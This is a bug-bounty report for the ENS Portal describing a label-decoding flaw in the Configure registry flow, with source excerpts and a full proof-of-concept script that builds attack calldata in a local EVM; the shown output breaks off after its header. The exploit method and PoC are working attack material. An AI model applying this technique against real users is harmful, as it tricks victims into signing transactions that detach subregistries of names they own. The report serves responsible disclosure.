# 92818 w a critical missing label validation in the portal s configure registry flow leads to subregistry detachment of a different real ens name

**Submitted on Sep 12th 2026 at 14:41:44 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92818
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Portal's Configure Registry flow slices a label directly off the displayed name string and hands it to the real ENSJS write-parameter builder, which computes the on-chain argument by decoding the label instead of hashing it. A name whose label is the literal 66-character string `"[" + hex(labelhash(V)) + "]"`, where `V` is a real name, makes the resulting transaction target `V`'s resource id instead of the name shown on screen. An attacker registers an ordinary, unprivileged name using that bracket string as its label, gifts it to a victim with a standard token transfer that needs no consent, and waits. The role check the app runs before showing the button decodes the same label the same way, so it passes: it is really asking whether the victim holds the role on `V`, which they do. When the victim opens the gift's Registry tab and clicks Configure registry, expecting to set a subregistry on the name shown on screen, their wallet signs a transaction that detaches the subregistry of `V` instead, orphaning every subname beneath it. We reproduced this on the real Portal build with a mined transaction: `V`'s subregistry moved and the bracket name's own slot stayed untouched.

## Vulnerability Details

`apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx:89-90` takes the label off the route's name string with no normalization:

```ts
const label = name.split('.')[0]
const parentRegistry = registries?.at(1) ?? null
```

The custom-subregistry submit path (`:373-382`) passes that label to `prepareSetSubregistryTransaction`, which calls the real ENSJS builder unmodified (`apps/portal/src/features/registry/helpers/setSubregistry.ts:59-63`):

```ts
const writeParams = setSubregistryWriteParameters(walletWithAccount, {
  registryAddress: parentRegistry,
  label,
  subregistryAddress,
})
```

ENSJS computes the argument by decoding, not hashing (`@ensdomains/ensjs@e96662c dist/actions/wallet/v2/setSubregistry.js:9`):

```js
const tokenId = BigInt(labelhash(label));
```

viem's `labelhash` tries to parse a `[<64 hex>]` string before it ever hashes anything (`viem@2.52.2 utils/ens/labelhash.js:14-16`, calling `utils/ens/encodedLabelToLabelhash.js:1-13`):

```js
return encodedLabelToLabelhash(label) || keccak256(stringToBytes(label));
```

A label written as `"[" + hex(labelhash(V)) + "]"` decodes to `labelhash(V)` verbatim. `setSubregistryWriteParameters` builds `setSubregistry(labelhash(V), subregistryAddress)` against the parent registry: an argument that identifies `V`, not the name on screen.

The role gate the app queries before rendering the button decodes the same label the same way (`ConfigureRegistryForm.tsx:92-100`):

```ts
...getHasRolesQueryOptions({
  registryAddress: parentRegistry ?? zeroAddress,
  label,
  roles: ['ROLE_SET_SUBREGISTRY'],
  account: connectedAddress ?? zeroAddress,
}),
```

ENSJS's `hasRoles` computes the same resource from the same label (`dist/actions/public/v2/hasRoles.js:70`):

```js
const resource = 'label' in params ? BigInt(labelhash(params.label)) : 0n;
```

The query asks whether the connected account holds `ROLE_SET_SUBREGISTRY` on `labelhash(V)`. The victim owns `V` and holds that role there, so the query returns true and the "Configure registry" button renders and is clickable, instead of the disabled state the form shows when the role check fails (`ConfigureRegistryForm.tsx:233-249`).

The guard that would catch this exists and is not called on this path. `apps/portal/src/utils/token/getLabel.ts:10-19` extracts a label through `ens_normalize`/`ens_split` and throws on invalid input; `[` fails normalization. `ConfigureRegistryForm.tsx:89` uses `name.split('.')[0]` instead of this accessor.

### Vulnerable source code

**1. The label sliced from the display string, no normalization** @ `apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx:89-90`

```ts
const label = name.split('.')[0]
const parentRegistry = registries?.at(1) ?? null
```

**2. The label reaches the real ENSJS builder unmodified** @ `apps/portal/src/features/registry/helpers/setSubregistry.ts:59-63`

```ts
const writeParams = setSubregistryWriteParameters(walletWithAccount, {
  registryAddress: parentRegistry,
  label,
  subregistryAddress,
})
```

**3. ENSJS builds the argument by decoding, not hashing** @ `@ensdomains/ensjs@e96662c dist/actions/wallet/v2/setSubregistry.js:7-14`

```js
export const setSubregistryWriteParameters = (client, { registryAddress, label, subregistryAddress, }) => {
    ASSERT_NO_TYPE_ERROR(client);
    const tokenId = BigInt(labelhash(label));
    return {
        address: registryAddress,
        abi: userRegistrySetSubregistrySnippet,
        functionName: 'setSubregistry',
        args: [tokenId, subregistryAddress],
```

**4. viem tries the bracket decode before it ever hashes** @ `viem@2.52.2 utils/ens/labelhash.js:14-16`

```js
export function labelhash(label) {
    const result = new Uint8Array(32).fill(0);
    if (!label) return bytesToHex(result);
    return encodedLabelToLabelhash(label) || keccak256(stringToBytes(label));
}
```

**5. The role gate queried before the button renders, same label, same decode** @ `apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx:92-100`

```ts
const { data: hasSetSubregistryRole, isLoading: isLoadingRoleCheck } =
  useQuery({
    ...getHasRolesQueryOptions({
      registryAddress: parentRegistry ?? zeroAddress,
      label,
      roles: ['ROLE_SET_SUBREGISTRY'],
      account: connectedAddress ?? zeroAddress,
    }),
```

**6. ENSJS `hasRoles` resolves the same resource from the same label** @ `@ensdomains/ensjs@e96662c dist/actions/public/v2/hasRoles.js:70`

```js
const resource = 'label' in params ? BigInt(labelhash(params.label)) : 0n;
```

**7. The normalizing accessor that exists and is not called on this path** @ `apps/portal/src/utils/token/getLabel.ts:10-19`

```ts
export function getLabel(name: string): string {
  const normalized = ens_normalize(name)
  const labels = ens_split(normalized)
  const first = labels[0]
  if (!first || first.error) {
    throw first?.error
  }
  return String.fromCodePoint(...first.input)
}
```

## Impact Details

The impact row claimed is the Critical **"Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address"**, discharged clause first, then illustration:

* **The governing clause, "Malicious interactions with an already-connected wallet."** The victim's wallet is already connected: they are signed into the Explorer, on the Registry tab of a name they received (`evidence/P-02-junk-registry.png`). Nothing in the flow asks them to connect a wallet, visit an attacker-supplied URL, or leave the app.
* **The illustration matched, "Modifying transaction arguments or parameters."** `setSubregistry(uint256 tokenId, address subregistryAddress)` takes a resource id argument. The name displayed is the bracket string, whose own chain identity is `keccak256` of its literal 66-character label. The argument the wallet actually signs is `labelhash(V)`, the identity of a different, real name the victim owns. The attacker selects which of the victim's names that argument targets, by choosing which name's labelhash to embed in the bracket string before registering it. Mined: tx `0x19da10877ae687966bd14e9e051b7b24f40478c1720996bb2d0b4794c7058092`, block 11654500; `r42victimb2.eth`'s subregistry moved `0x693C1f80C7FFD9aB7f4563678516dF283D357D26` to `0xb388b0FBD944925Ed69d4b0D5F43a7cCFD044E74`, the bracket name's own subregistry slot stayed `0x0000000000000000000000000000000000000000` (`evidence/FORENSICS.txt`).
* **The row's other illustrations do not apply, and are not claimed.** The `to` address is the correct parent registry, the shared `.eth` registry `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2` (no contract substitution); the chain id matches the connected wallet's network; no token approval of any kind is requested on this path.
* **The attacker needs no role and no privilege.** Registering the bracket-labelled name is an ordinary paid registration. Gifting it uses a standard token transfer that needs no consent from the victim.
* **The victim cannot tell the row apart from any other name they received.** The Registry tab renders identically regardless of which resource the underlying transaction will actually hit; nothing in the UI surfaces the mismatch between the displayed label and the decoded resource id (`evidence/P-02-junk-registry.png`, `evidence/P-04-after-configureregistry.png`).
* **The detachment persists with no in-app undo.** `WEB-716` (published, Medium) establishes that the Registry page only offers the deploy-subregistry action when the slot is empty, so there is no in-app "replace" action once a subregistry is set. That published limitation is the recovery story here, not a shield for this defect: after the attack, `V`'s slot is no longer empty, so the app's own UI offers no path back to the previous subregistry.
* **Reachability, the material addition over the prior kill.** This defect and its `unregister` sibling (below) were previously killed on grounds that the terminal action, deploying or configuring a subregistry on a gifted bracket name, has no in-product motive. That premise does not hold for a bracket-labelled row planted inside the victim's own Subnames tab, a different entry point from a name gifted as a standalone entry: `apps/portal/src/components/EntityBadge.tsx:259-263` renders every subname row as `<Link to="/$name" params={{ name }}>`; `apps/portal/src/features/names/components/SubnamesTable.tsx:103-110` renders every row through that badge; and the row's own page links onward to its own Registry tab through the "Deploy subregistry" action button (`apps/portal/src/routes/$name/subnames.tsx:62-67`, `href: \`/${encodeURIComponent(name)}/registry\`\`). A bracket-labelled row planted in the victim's own Subnames tab is reachable from a task the victim is already doing: ordinary housekeeping on their own name, one click to the row's own page, one more to its Registry tab. This chain is source-verified at the three files above and has not been driven in a browser; the mined transaction and screenshots cited in this report use the gifted-standalone-name delivery, which is executed.

## References

**The write path**

* `apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx:89-90` - the label slice, no normalization
* `apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx:373-382` - the custom-subregistry transaction intent, passes `label` to the real transaction builder
* `apps/portal/src/features/registry/helpers/setSubregistry.ts:59-69` - calls ENSJS `setSubregistryWriteParameters` with the raw label, builds calldata
* `@ensdomains/ensjs@e96662c dist/actions/wallet/v2/setSubregistry.js:7-18` - `args: [BigInt(labelhash(label)), subregistryAddress]`
* `viem@2.52.2 utils/ens/labelhash.js:14-16` - bracket decode tried before `keccak256`
* `viem@2.52.2 utils/ens/encodedLabelToLabelhash.js:1-13` - the `[<64 hex>]` parse

**The gate that does not catch it**

* `apps/portal/src/features/registry/components/v2/ConfigureRegistryForm.tsx:92-100` - `hasSetSubregistryRole` query, same raw label
* `@ensdomains/ensjs@e96662c dist/actions/public/v2/hasRoles.js:70` - `BigInt(labelhash(params.label))`, the same decode

**The guard that exists and is not called**

* `apps/portal/src/utils/token/getLabel.ts:10-19` - the normalizing accessor; `ens_normalize` rejects `[`

**Reachability (the material addition over the prior kill)**

* `apps/portal/src/components/EntityBadge.tsx:259-263` - every name-variant badge is a `<Link to="/$name">`
* `apps/portal/src/features/names/components/SubnamesTable.tsx:103-110` - every subname row renders through that badge
* `apps/portal/src/routes/$name/subnames.tsx:62-67` - the row's own Subnames tab links onward to its own `/registry`

## Proof of Concept

## Proof of Concept

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: apps/portal's "Configure registry" flow (ConfigureRegistryForm.tsx)
// builds its on-chain argument with viem's labelhash(), which DECODES a
// "[<64 hex>]" label instead of hashing it. A name whose literal label is
// "[" + hex(labelhash(V)) + "]" makes setSubregistry(labelhash(V), ...) fire
// against a DIFFERENT, real name V, while the screen shows only the bracket
// name. The role gate the app queries before showing the button decodes the
// same way and passes, because it is really asking whether the caller is
// authorized to configure V, which the victim owns.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it writes its helpers to a temp dir, installs
// pinned deps there, and re-execs itself. No wallet, no RPC, no fork needed
// to run this script.
//
// LAYER A is the real pinned ENSJS write-parameter builder the app calls
// (@ensdomains/ensjs/wallet, pinned to this repo's pnpm-workspace.yaml
// catalog entry, e96662c), loaded and run unmodified. Nothing here
// reimplements labelhash or setSubregistryWriteParameters.
//
// LAYER B is a compiled Solidity model of the v2 registry's role gate and
// setSubregistry state transition (the real contracts are audited
// separately and out of scope). Every constant is read from this repo's own
// source, cited at each use.
//
// GROUND TRUTH: the on-chain values asserted below (V's real chain token id,
// the subregistry address before the attack) were read independently from
// the chain during the mined-transaction corroboration of this exact bug
// (evidence/FORENSICS.txt, tx 0x19da10877ae687966bd14e9e051b7b24f40478c1720996bb2d0b4794c7058092,
// block 11654500), not derived from the bracket label by this script. ACT 6
// below builds calldata with the real ENSJS function from the bracket label
// alone, decodes it, and checks the result against those independently
// recorded values.

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-bracket-setsubregistry-detach')

// ---------------------------------------------------------------- cast
// VICTIM matches the anvil default-mnemonic account used in the browser and
// mined-transaction corroboration of this bug (evidence/FORENSICS.txt:2).
// ATTACKER is a representative zero-privilege address (anvil default account
// #1); no specific attacker address is recorded in FORENSICS.txt because the
// browser leg used one wallet to play both roles (gift needs no victim
// consent, so the same key can register the bracket name and then, as
// "victim", click Configure registry -- see FINDING.md honest limits).
const VICTIM = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'
const ATTACKER = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'

// The shared .eth registry the real attack transaction targeted
// (evidence/FORENSICS.txt: "REGISTRY 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2").
const SHARED_ETH_REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'

// V = r42victimb2.eth, the victim's real name (evidence/FORENSICS.txt:8-9).
const V_LABEL = 'r42victimb2'
// Read independently from the chain for V, NOT derived from the bracket
// label anywhere in this script (evidence/FORENSICS.txt:9,26).
const V_CHAIN_TOKEN_ID = 0x2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2d00000000n
// V's subregistry immediately before the attack (evidence/FORENSICS.txt:34).
const V_SUBREGISTRY_BEFORE = '0x693C1f80C7FFD9aB7f4563678516dF283D357D26'
// The address the real mined transaction wrote into V's subregistry slot
// (evidence/FORENSICS.txt:30,33).
const NEW_SUBREGISTRY = '0xb388b0FBD944925Ed69d4b0D5F43a7cCFD044E74'

// The literal 66-character label the attacker registers. Built once, offline,
// from labelhash(V_LABEL) -- exactly as ConfigureRegistryForm.tsx:89 would
// read it off any real name string typed into the app.
const BRACKET_LABEL_HEX_BODY = '2e5a30f4493e532c48145df078c4137c50aaf0ce0d18a764f98bde2dab58cf5e'
const BRACKET_LABEL = `[${BRACKET_LABEL_HEX_BODY}]`

// ============================================================== generated files

const PKG = `{
  "name": "ens-poc-bracket-setsubregistry-detach",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c",
    "@ensdomains/ensjs-abi": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c",
    "@ethereumjs/common": "^4.4.0",
    "@ethereumjs/evm": "^3.1.0",
    "@ethereumjs/statemanager": "^2.4.0",
    "@ethereumjs/util": "^9.1.0",
    "solc": "0.8.28",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

// Lets the repo's own source (only permissions.ts is loaded, for parity with
// the sibling PoC's bootstrap) run unmodified against these pinned deps.
const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')

// path.relative is WRONG across drives on Windows (G: vs C:); it returns an
// absolute path, which would make every node_modules file count as a repo file.
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  if (isRepoFile(context.parentURL) && isBare(specifier))
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

// LAYER B. The v2 contracts are audited separately and are not in the
// in-scope repo, so this models only what the impact depends on. Every
// constant is read from this repo's own source, not invented:
//   ROLE_SET_SUBREGISTRY = 1<<20, "Root or token"
//     -> node_modules/.../ensjs/dist/utils/v2/roles/registryRoles.js:16-17
//   ENS v2 token ids are (resource id << 32 | version); the registry
//   canonicalises by masking the low 32 bits on every read, so a raw-signed
//   resource and its canonical form resolve to the SAME role/subregistry
//   state -- exactly what the mined transaction shows
//   (evidence/FORENSICS.txt:25-29, arg0 as-signed vs arg0 canonicalised).
const SOL = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract PermissionedRegistryModel {
    uint256 constant ROLE_SET_SUBREGISTRY = 1 << 20;
    uint256 constant VERSION_MASK = 0xffffffff;

    mapping(uint256 => mapping(address => uint256)) public roleBits; // canonical resource => account => bitmap
    mapping(uint256 => address) public subregistryOf;                // canonical resource => subregistry
    mapping(uint256 => bool) public taken;

    error Unauthorized(uint256 resource, address caller, uint256 needed);
    error AlreadyRegistered(uint256 resource);

    function canonicalize(uint256 anyId) public pure returns (uint256) {
        return anyId & ~VERSION_MASK;
    }

    function hasRoles(uint256 anyId, uint256 roles, address account) public view returns (bool) {
        uint256 resource = canonicalize(anyId);
        if (roleBits[0][account] & roles == roles) return true; // ROOT fallback
        return roleBits[resource][account] & roles == roles;
    }

    /// An ordinary paid registration: the registrant gets every role at
    /// their own resource. Permissionless, matching real 2LD registration.
    function register(uint256 anyId, address owner_) external {
        uint256 resource = canonicalize(anyId);
        if (taken[resource]) revert AlreadyRegistered(resource);
        taken[resource] = true;
        roleBits[resource][owner_] = type(uint256).max;
    }

    /// Setup only: seeds V's subregistry to its real pre-attack value,
    /// the same state an earlier "Deploy subregistry" action produced.
    function seedSubregistry(uint256 anyId, address subregistry_) external {
        subregistryOf[canonicalize(anyId)] = subregistry_;
    }

    /// ConfigureRegistryForm.tsx's on-chain target
    /// (setSubregistry.ts:59 -> ensjs setSubregistry.js:9-14).
    function setSubregistry(uint256 anyId, address newSubregistry) external {
        uint256 resource = canonicalize(anyId);
        if (!hasRoles(anyId, ROLE_SET_SUBREGISTRY, msg.sender))
            revert Unauthorized(resource, msg.sender, ROLE_SET_SUBREGISTRY);
        subregistryOf[resource] = newSubregistry;
    }
}
`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: Configure-registry decodes a bracket label instead of')
  console.log('           hashing it, and detaches a different, real name\'s subregistry')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(REPO, 'apps', 'portal'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  writeFileSync(path.join(WORK, 'Model.sol'), SOL)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs @e96662c, solc 0.8.28)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer A

const { setSubregistryWriteParameters } = await import('@ensdomains/ensjs/wallet')
const { decodeFunctionData, encodeFunctionData, keccak256, labelhash, stringToBytes } =
  await import('viem')

// A fake wallet client. The write-parameter builder reads only .chain/.account
// off it; it performs no RPC call.
const client = { chain: { id: 11155111 }, account: { address: VICTIM } }

// ============================================================== EVM

const require_ = createRequire(import.meta.url)
const { Common, Hardfork } = await import('@ethereumjs/common')
const { EVM } = await import('@ethereumjs/evm')
const { DefaultStateManager } = await import('@ethereumjs/statemanager')
const { Account, Address, hexToBytes } = await import('@ethereumjs/util')

const compileModel = () => {
  const solc = require_('solc')
  const out = JSON.parse(solc.compile(JSON.stringify({
    language: 'Solidity',
    sources: { 'Model.sol': { content: readFileSync(path.join(WORK, 'Model.sol'), 'utf8') } },
    settings: { optimizer: { enabled: true, runs: 200 },
                outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
  })))
  const fatal = (out.errors ?? []).filter((e) => e.severity === 'error')
  if (fatal.length) throw new Error(fatal.map((e) => e.formattedMessage).join('\n'))
  const c = out.contracts['Model.sol'].PermissionedRegistryModel
  return { abi: c.abi, bytecode: `0x${c.evm.bytecode.object}` }
}

const GAS = 30_000_000n
const addr = (a) => new Address(hexToBytes(a))

class RevertError extends Error {}

class Chain {
  constructor(evm, sm) { this.evm = evm; this.sm = sm }

  static async create() {
    const sm = new DefaultStateManager()
    return new Chain(await EVM.create({
      common: new Common({ chain: 1, hardfork: Hardfork.Shanghai }), stateManager: sm }), sm)
  }

  async fund(a, wei) {
    const acct = (await this.sm.getAccount(addr(a))) ?? new Account()
    acct.balance = wei
    await this.sm.putAccount(addr(a), acct)
  }

  async deploy(from, bytecode) {
    const res = await this.evm.runCall(
      { caller: addr(from), origin: addr(from), data: hexToBytes(bytecode), gasLimit: GAS })
    if (res.execResult.exceptionError) throw new Error('deploy reverted')
    return res.createdAddress.toString()
  }

  /// Send PRE-ENCODED calldata, used to replay Layer A's real bytes verbatim.
  async raw({ from, to, data, abi, fn }) {
    const res = await this.evm.runCall({ caller: addr(from), origin: addr(from), to: addr(to),
      data: hexToBytes(data), gasLimit: GAS })
    const ex = res.execResult
    const ret = `0x${Buffer.from(ex.returnValue).toString('hex')}`
    if (ex.exceptionError) {
      let reason = `reverted ${ret.slice(0, 10)}`
      try {
        const d = require_('viem').decodeErrorResult({ abi, data: ret })
        reason = `${d.errorName}(${(d.args ?? []).map((a) =>
          typeof a === 'bigint' ? `0x${a.toString(16)}` : String(a)).join(', ')})`
      } catch {}
      throw new RevertError(reason)
    }
    const outs = abi?.find((x) => x.type === 'function' && x.name === fn)?.outputs
    if (!outs?.length) return undefined
    return require_('viem').decodeFunctionResult({ abi, functionName: fn, data: ret })
  }

  async send({ abi, fn, args = [], ...rest }) {
    return this.raw({ ...rest, abi, fn, data: encodeFunctionData({ abi, functionName: fn, args }) })
  }

  async call(opts) { return this.send({ ...opts, from: '0x' + '00'.repeat(19) + '01' }) }
}

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(34)} ${v}`)
const short = (h) => `${h.slice(0, 10)}...${h.slice(-6)}`
const canon = (id) => id & ~0xffffffffn

act('ACT 1', "viem's labelhash() decodes the bracket label onto V, not the attacker's own name")
const hV = labelhash(V_LABEL)
kv(`labelhash("${V_LABEL}")`, hV)
kv('BRACKET_LABEL', BRACKET_LABEL)
const hBracket = labelhash(BRACKET_LABEL)
kv('labelhash(BRACKET_LABEL)', hBracket)
if (hBracket !== hV) throw new Error('premise broken: bracket label does not decode onto V')
say()
say('  >> Identical. viem/utils/ens/labelhash.js tries encodedLabelToLabelhash()')
say('     first, which reads the 64 hex characters between [ and ] straight')
say('     out, before it ever tries keccak256.')
say()
const kBracket = keccak256(stringToBytes(BRACKET_LABEL))
kv('keccak256(bytes(BRACKET_LABEL))', kBracket)
say('  >> Different. This is the identity the CHAIN assigns the bracket name')
say('     itself when the attacker registers it (LibLabel.id hashes the')
say('     literal string). The two identities of the same on-screen row')
say('     diverge here.')
if (kBracket === hV) throw new Error('premise broken: hash collision')

act('ACT 2', "Local EVM: victim registers V, seeds V's real pre-attack subregistry")
const c = compileModel()
const chain = await Chain.create()
for (const a of [VICTIM, ATTACKER]) await chain.fund(a, 10n * 10n ** 18n)
const registry = await chain.deploy(VICTIM, c.bytecode)
kv('PermissionedRegistryModel', registry)
await chain.send({ from: VICTIM, to: registry, abi: c.abi, fn: 'register', args: [V_CHAIN_TOKEN_ID, VICTIM] })
await chain.send({ from: VICTIM, to: registry, abi: c.abi, fn: 'seedSubregistry', args: [V_CHAIN_TOKEN_ID, V_SUBREGISTRY_BEFORE] })
const vSubBefore = await chain.call({ to: registry, abi: c.abi, fn: 'subregistryOf', args: [V_CHAIN_TOKEN_ID] })
kv('V subregistry, seeded', vSubBefore)
if (vSubBefore.toLowerCase() !== V_SUBREGISTRY_BEFORE.toLowerCase()) throw new Error('seed did not land')

act('ACT 3', "The attacker registers the bracket label at ITS TRUE chain id, gets roles only there")
await chain.send({ from: ATTACKER, to: registry, abi: c.abi, fn: 'register', args: [kBracket, ATTACKER] })
const attackerAtBracket = await chain.call({ to: registry, abi: c.abi, fn: 'hasRoles', args: [kBracket, 1n << 20n, ATTACKER] })
const attackerAtV = await chain.call({ to: registry, abi: c.abi, fn: 'hasRoles', args: [V_CHAIN_TOKEN_ID, 1n << 20n, ATTACKER] })
kv('hasRoles(bracket true id, ROLE_SET_SUBREGISTRY, attacker)', attackerAtBracket)
kv('hasRoles(V, ROLE_SET_SUBREGISTRY, attacker)', attackerAtV)
if (!attackerAtBracket) throw new Error('mint did not land')
if (attackerAtV) throw new Error('attacker unexpectedly holds roles on V')

act('ACT 4', "CONTROL: the attacker's own direct setSubregistry on V reverts")
const ATTACKER_SUBREGISTRY = '0x000000000000000000000000000000000000dEaD'
let controlReverted = false
try {
  await chain.send({ from: ATTACKER, to: registry, abi: c.abi, fn: 'setSubregistry', args: [V_CHAIN_TOKEN_ID, ATTACKER_SUBREGISTRY] })
} catch (e) {
  if (!(e instanceof RevertError)) throw e
  controlReverted = true
  say(`  ATTACKER.setSubregistry(V, attackerSubregistry) -> REVERTED: ${e.message}`)
}
if (!controlReverted) throw new Error('control failed: attacker was already authorized to set V\'s subregistry')
say()
say('  >> An attacker who registers the bracket name has no direct path to')
say('     V. Whatever happens next is created by the decode, not by')
say("     authority the attacker already had.")

act('ACT 5', "The role gate the app queries before showing the button decodes the same way")
const gateResult = await chain.call({ to: registry, abi: c.abi, fn: 'hasRoles', args: [hBracket, 1n << 20n, VICTIM] })
kv('hasRoles(labelhash(BRACKET_LABEL), ROLE_SET_SUBREGISTRY, victim)', gateResult)
if (!gateResult) throw new Error('gate did not pass for the victim')
say()
say('  >> ConfigureRegistryForm.tsx:92-100 runs exactly this check with the')
say('     bracket label. It decodes onto V, which the victim owns, so the')
say('     "Configure registry" button renders instead of staying disabled.')

act('ACT 6', "THE ATTACK: the real ENSJS calldata for the bracket label targets V instead")
const writeParams = setSubregistryWriteParameters(client, {
  registryAddress: SHARED_ETH_REGISTRY,
  label: BRACKET_LABEL,
  subregistryAddress: NEW_SUBREGISTRY,
})
const attackData = encodeFunctionData({ abi: writeParams.abi, functionName: writeParams.functionName, args: writeParams.args })
const decoded = decodeFunctionData({ abi: writeParams.abi, data: attackData })
kv('setSubregistryWriteParameters(label=BRACKET_LABEL).functionName', writeParams.functionName)
kv('decoded.args[0] (resource, as signed)', `0x${decoded.args[0].toString(16)}`)
kv('canonical(decoded.args[0])', `0x${canon(decoded.args[0]).toString(16)}`)
kv('V_CHAIN_TOKEN_ID (independently read from chain)', `0x${V_CHAIN_TOKEN_ID.toString(16)}`)
if (writeParams.functionName !== 'setSubregistry') throw new Error('wrong entrypoint')
if (canon(decoded.args[0]) !== V_CHAIN_TOKEN_ID)
  throw new Error('calldata does not resolve to V\'s independently recorded chain token id')
say()
say('  >> The real ensjs function, given only the bracket label and the new')
say('     subregistry address, builds calldata whose argument canonicalises')
say('     to V\'s own chain token id -- recorded independently from the chain')
say('     during this bug\'s mined-transaction corroboration, not derived')
say('     from the bracket label anywhere in this script (evidence/FORENSICS.txt:9,26).')

act('ACT 7', "The victim's wallet signs it: V's subregistry moves, the bracket row's stays 0x0")
const bracketSubBeforeSend = await chain.call({ to: registry, abi: c.abi, fn: 'subregistryOf', args: [kBracket] })
await chain.raw({ from: VICTIM, to: registry, data: attackData, abi: c.abi })
const vSubAfter = await chain.call({ to: registry, abi: c.abi, fn: 'subregistryOf', args: [V_CHAIN_TOKEN_ID] })
const bracketSubAfter = await chain.call({ to: registry, abi: c.abi, fn: 'subregistryOf', args: [kBracket] })
kv('V subregistry, after', vSubAfter)
kv('bracket row subregistry, before -> after', `${bracketSubBeforeSend} -> ${bracketSubAfter}`)
if (vSubAfter.toLowerCase() !== NEW_SUBREGISTRY.toLowerCase()) throw new Error('V was not detached')
if (bracketSubAfter !== '0x0000000000000000000000000000000000000000') throw new Error('bracket row was touched')

say()
rule('-')
say('  LEDGER (subregistry pointer, read from the EVM state trie)')
rule('-')
say('    resource                    before                          after')
say(`    V  (${V_LABEL}.eth, real)     ${short(vSubBefore)}     ${short(vSubAfter)}`)
say(`    BRACKET  (attacker's own)     ${short(bracketSubBeforeSend)}   ${short(bracketSubAfter)}`)
rule('-')
say()
say('  >> The transaction the victim signed to configure the registry on the')
say("     row displayed on screen moved V's subregistry pointer instead. The")
say('     bracket name never had a subregistry set, and still does not.')
say()
say('  PoC PASSED, every assertion held.')
say()
```

### Output

```
==============================================================================
  ENS PoC: Configure-registry decodes a bracket label instead of
           hashing it, and detaches a different, real name's subregistry
